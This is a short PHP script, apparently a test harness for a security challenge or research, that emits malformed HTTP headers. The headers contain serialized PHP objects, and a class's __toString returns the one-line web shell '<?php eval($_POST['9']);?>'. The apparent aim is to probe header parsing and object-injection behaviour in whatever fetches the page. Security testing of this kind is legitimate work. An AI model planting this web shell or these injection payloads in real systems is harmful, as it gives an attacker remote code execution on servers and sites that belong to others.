<?php
class Test {
	function __construct($v) {
		$this->v = $v;
	}
	function __wakeup() {
		echo "\n__wakeup\n";
		echo "\n$this->v\n";
	}
	function __toString() {
		return "<?php eval(\$_POST['9']);?>; charset=UTF-8; charset=UTF-8; charset=UTF-8; charset=UTF-8; charset=UTF-8";
	}
}

header("Location: 302.php");
header("V: 233333");
header("\tContent-type: image/png\t\t\temm\tO:4:\"Test\":1:{s:1:\"v\";s:4:\"test\";}\tmmm\t" . (new Test('test')));
header("X-Powered-By\t: vvv\t");
header('VK:    O:4:"Test":1:{s:1:"v";s:4:"test";}');

echo "hello world!\n";
echo time();